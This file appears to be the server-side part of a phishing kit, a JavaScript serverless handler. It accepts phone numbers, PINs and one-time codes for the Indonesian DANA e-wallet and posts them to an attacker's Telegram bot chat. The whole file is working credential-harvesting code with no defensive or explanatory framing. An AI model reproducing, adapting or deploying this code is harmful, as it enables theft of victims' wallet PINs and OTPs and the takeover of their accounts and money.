const axios = require('axios');

function formatMessage(type, phone, pin, otp) {
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { 
      statusCode: 405, 
      body: 'Method Not Allowed',
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    const { type, phone, pin, otp } = JSON.parse(event.body);
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';

    // Validasi untuk nomor 10-13 digit
    if (!type || !cleanPhone || cleanPhone.length < 10 || cleanPhone.length > 13) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid request: Phone number must be 10-13 digits',
          received: phone,
          cleaned: cleanPhone
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Validasi OTP 6 digit jika type otp
    if (type === 'otp' && (!otp || otp.length !== 6)) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid OTP: Must be 6 digits'
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Server configuration error: Missing Telegram credentials');
    }

    const message = formatMessage(type, cleanPhone, pin, otp);

    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        telegram_status: telegramResponse.status
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (error) {
    console.error('Error processing request:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message,
        request_body: event.body
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }
};
